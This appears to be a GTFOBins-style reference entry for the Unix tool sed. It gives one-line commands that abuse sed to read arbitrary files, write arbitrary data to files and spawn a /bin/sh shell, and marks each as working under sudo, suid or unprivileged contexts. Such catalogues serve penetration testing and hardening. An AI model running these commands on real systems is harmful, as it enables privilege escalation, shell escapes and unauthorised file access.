---
type: gtfobin
name: sed
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# sed

## file-read

```bash
sed '' /path/to/input-file
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```
**Contexts:** sudo, suid, unprivileged

```bash
sed e
```
**Contexts:** sudo, suid, unprivileged
